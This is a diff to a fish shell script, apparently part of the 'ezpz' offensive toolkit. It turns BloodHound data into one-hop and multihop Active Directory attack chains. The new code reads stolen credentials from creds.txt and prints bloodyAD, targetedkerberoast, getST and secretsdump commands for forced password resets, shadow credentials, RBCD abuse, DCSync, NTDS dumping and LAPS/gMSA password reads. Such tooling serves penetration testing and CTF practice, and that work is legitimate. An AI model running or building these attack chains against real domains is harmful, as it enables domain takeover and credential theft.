@@ -41,25 +41,139 @@ function __ezpz_path_generic --argument-names base target target_type target_nam
     end
 end
 
+
+function __ezpz_path_secret --argument-names user domain
+    set -l file creds.txt
+    if set -q boxpwd; and test -f "$boxpwd/creds.txt"
+        set file "$boxpwd/creds.txt"
+    end
+    test -f "$file"; or return
+
+    while read -l line
+        set line (string trim -- $line)
+        test -z "$line"; and continue
+        string match -q '#*' -- $line; and continue
+        set -l parts (string split -m1 ':' -- $line)
+        test (count $parts) -ge 2; or continue
+        set -l identity $parts[1]
+        set -l item_user $identity
+        set -l item_domain ""
+        if string match -q '*@*' -- $identity
+            set item_user (string split -m1 '@' -- $identity)[1]
+            set item_domain (string split -m1 '@' -- $identity)[2]
+        else if string match -rq '\\\\' -- $identity
+            set item_domain (string split -m1 '\\' -- $identity)[1]
+            set item_user (string split -m1 '\\' -- $identity)[2]
+        end
+        test (string lower -- $item_user) = (string lower -- $user); or continue
+        if test -n "$domain"; and test -n "$item_domain"; and test (string lower -- $item_domain) != (string lower -- $domain)
+            continue
+        end
+        echo $parts[2]
+        return
+    end < "$file"
+end
+
+function __ezpz_path_placeholder --argument-names user
+    set -l name (string upper -- $user)
+    set name (string replace -a -- '.' '_' $name)
+    set name (string replace -a -- '-' '_' $name)
+    set name (string replace -a -- '$' '' $name)
+    printf '<%s_CRED>\n' "$name"
+end
+
+function __ezpz_path_render_edge --argument-names edge target target_type target_name user domain secret hash dc newpass
+    set -l base_secret $secret
+    if test -n "$hash"
+        set base_secret $hash
+    end
+    set -l base "bloodyAD -H $dc -d $domain -u $user -p $base_secret"
+    switch $edge
+        case ForceChangePassword
+            __ezpz_path_print "$base set password $target '$newpass'"
+        case GenericAll AllExtendedRights WriteAllProperties
+            __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$user" "$domain" "$secret" "$hash" "$dc"
+        case GenericWrite
+            switch $target_type
+                case User
+                    ezpz_cmd "Option 1: shadow credentials"
+                    __ezpz_path_print "$base add shadowCredentials $target"
+                    ezpz_cmd "Option 2: targeted Kerberoast"
+                    if test -n "$hash"
+                        __ezpz_path_print "targetedkerberoast -d $domain -H '$hash' --request-user $target"
+                    else
+                        __ezpz_path_print "targetedkerberoast -d $domain -u $user -p '$secret' --request-user $target"
+                    end
+                case Computer
+                    ezpz_cmd "Option 1: shadow credentials"
+                    __ezpz_path_print "$base add shadowCredentials $target"
+                    ezpz_cmd "Option 2: RBCD + getST"
+                    __ezpz_path_print "$base add rbcd $target $user"
+                    __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
+                case '*'
+                    printf '%s\n' "No bloodyAD template for GenericWrite on $target_type target."
+            end
+        case WriteDacl
+            if test "$target_type" = Domain
+                ezpz_info "Step 1: grant DCSync"
+                __ezpz_path_print "$base add dcsync $user"
+                ezpz_info "Step 2: dump NTDS"
+                __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
+            else
+                ezpz_info "Step 1: grant GenericAll"
+                __ezpz_path_print "$base add genericAll $target $user"
+                ezpz_info "Step 2: exploit GenericAll"
+                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$user" "$domain" "$secret" "$hash" "$dc"
+            end
+        case WriteOwner Owns
+            ezpz_info "Step 1: take ownership"
+            __ezpz_path_print "$base set owner $target $user"
+            ezpz_info "Step 2: grant GenericAll"
+            __ezpz_path_print "$base add genericAll $target $user"
+            ezpz_info "Step 3: exploit GenericAll"
+            __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$user" "$domain" "$secret" "$hash" "$dc"
+        case AddMember AddSelf
+            __ezpz_path_print "$base add groupMember $target $user"
+        case DCSync GetChangesAll
+            __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
+        case AddKeyCredentialLink
+            __ezpz_path_print "$base add shadowCredentials $target"
+        case ReadLAPSPassword
+            __ezpz_path_print "$base get object $target --attr ms-Mcs-AdmPwd"
+        case ReadGMSAPassword
+            __ezpz_path_print "$base get object $target --attr msDS-ManagedPassword"
+        case AllowedToAct
+            ezpz_info "Step 1: configure RBCD"
+            __ezpz_path_print "$base add rbcd $target $user"
+            ezpz_info "Step 2: request service ticket"
+            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
+        case AllowedToDelegate
+            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "$target" "<IMPERSONATED_USER>"
+    end
+end
+
 function _ezpz_path
     source "$EZPZ_HOME/functions/_ezpz_colors.fish"
     ezpz_banner path
 
     set -l usage "
-Usage: ezpz path -u <user> -d <domain> (-p <password> | -H <hash>) [-f <bloodhound.zip>] [-t <dc>]
+Usage: ezpz path -u <user> -d <domain> [-p <password> | -H <hash>] [options]
 
-Shows one-hop AD attack paths for a user from BloodHound data.
+Shows one-hop AD attack paths or a multihop chain from BloodHound data.
 
   -u, --user      Principal to analyze (required)
   -d, --domain    Domain used in generated commands (required)
-  -p, --password  Password used in generated commands (required unless -H)
-  -H, --hash      NTLM hash used in generated commands (required unless -p)
+  -p, --password  Password used in generated commands (default: creds.txt)
+  -H, --hash      NTLM hash used in generated commands (default: creds.txt)
   -f, --file      BloodHound zip (default: <domain>_bloodhound.zip)
   -t, --target    DC IP or hostname used in generated commands
+  --chain         Search a multihop attack chain
+  --to            Chain target (default: domain object)
+  --depth         Maximum chain depth (default: 6)
   -h, --help      Show this help message
 "
 
-    argparse 'u/user=' 'f/file=' 'd/domain=' 't/target=' 'p/password=' 'H/hash=' 'h/help' -- $argv
+    argparse 'u/user=' 'f/file=' 'd/domain=' 't/target=' 'p/password=' 'H/hash=' 'chain' 'to=' 'depth=' 'h/help' -- $argv
     or begin
         ezpz_error "Invalid arguments."
         echo $usage
@@ -92,12 +206,6 @@ Shows one-hop AD attack paths for a user from BloodHound data.
     end
     set -l domain (string lower -- $_flag_domain)
 
-    if not set -q _flag_password; and not set -q _flag_hash
-        ezpz_error "Missing authentication: use -p/--password or -H/--hash."
-        echo $usage
-        return 1
-    end
-
     set -l zip_file ""
     if set -q _flag_file
         set zip_file $_flag_file
@@ -115,7 +223,17 @@ Shows one-hop AD attack paths for a user from BloodHound data.
         return 1
     end
 
-    set -l records (python3 "$helper" --zip "$zip_file" --from "$source_user" 2>&1)
+    set -l helper_args --zip "$zip_file" --from "$source_user"
+    if set -q _flag_chain
+        set -a helper_args --chain
+        if set -q _flag_to
+            set -a helper_args --to "$_flag_to"
+        end
+        if set -q _flag_depth
+            set -a helper_args --depth "$_flag_depth"
+        end
+    end
+    set -l records (python3 "$helper" $helper_args 2>&1)
     set -l rc $status
     if test $rc -ne 0
         ezpz_error "$records"
@@ -123,10 +241,22 @@ Shows one-hop AD attack paths for a user from BloodHound data.
     end
 
     set -l paths
+    set -l chain_steps
+    set -l chain_source ""
+    set -l chain_target ""
+    set -l chain_target_type ""
     for record in $records
         set -l fields (string split \t -- $record)
-        if test "$fields[1]" != SOURCE
-            set -a paths $record
+        switch "$fields[1]"
+            case SOURCE
+                set chain_source $fields[2]
+            case TARGET
+                set chain_target $fields[2]
+                set chain_target_type $fields[3]
+            case STEP
+                set -a chain_steps $record
+            case '*'
+                set -a paths $record
         end
     end
 
@@ -144,6 +274,12 @@ Shows one-hop AD attack paths for a user from BloodHound data.
         set hash $_flag_hash
     else if set -q _flag_password
         set secret $_flag_password
+    else
+        set secret (__ezpz_path_secret "$source_user" "$domain" | head -1)
+        if string match -qr '^[a-fA-F0-9]{32}$' -- "$secret"
+            set hash $secret
+            set secret ""
+        end
     end
     test -n "$secret"; or set secret "<PASS>"
     set -l base_secret $secret
@@ -152,6 +288,62 @@ Shows one-hop AD attack paths for a user from BloodHound data.
     end
 
     set -l base "bloodyAD -H $dc -d $domain -u $source_user -p $base_secret"
+
+    if set -q _flag_chain
+        if test (count $chain_steps) -eq 0
+            printf '%s\n' "No attack chain found."
+            echo
+            ezpz_success "Done."
+            return 0
+        end
+        set -l current_user $source_user
+        set -l current_secret $secret
+        set -l current_hash $hash
+        ezpz_header "Attack chain: $chain_source -> $chain_target"
+        set -l total_steps (count $chain_steps)
+        set -l step_index 0
+        for step_record in $chain_steps
+            set -l fields (string split \t -- $step_record)
+            set step_index (math $step_index + 1)
+            set -l edge $fields[3]
+            set -l step_source $fields[4]
+            set -l step_target $fields[5]
+            set -l step_type $fields[6]
+            set -l step_dn $fields[7]
+            set -l step_fqdn $fields[8]
+            ezpz_title "Step $step_index: $step_source -> $step_target"
+            ezpz_info "$edge"
+            __ezpz_path_render_edge "$edge" "$step_target" "$step_type" "$step_fqdn" "$current_user" "$domain" "$current_secret" "$current_hash" "$dc" "ezpzr0cks!"
+            if test $step_index -lt $total_steps
+                set -l next_secret ""
+                if test "$edge" = ForceChangePassword
+                    set next_secret "ezpzr0cks!"
+                    set current_hash ""
+                else
+                    set next_secret (__ezpz_path_secret "$step_target" "$domain" | head -1)
+                    if string match -qr '^[a-fA-F0-9]{32}$' -- "$next_secret"
+                        set current_hash $next_secret
+                        set next_secret "<PASS>"
+                    else if test -z "$next_secret"
+                        set next_secret (__ezpz_path_placeholder "$step_target")
+                        set current_hash ""
+                    else
+                        set current_hash ""
+                    end
+                end
+                set current_user $step_target
+                set current_secret $next_secret
+                if test -n "$current_hash"
+                    ezpz_info "Next: authenticate as $step_target with hash $current_hash"
+                else
+                    ezpz_info "Next: authenticate as $step_target with $current_secret"
+                end
+            end
+        end
+        echo
+        ezpz_success "Done."
+        return 0
+    end
 
     ezpz_header "Attack paths for $source_user"
     if test (count $paths) -eq 0
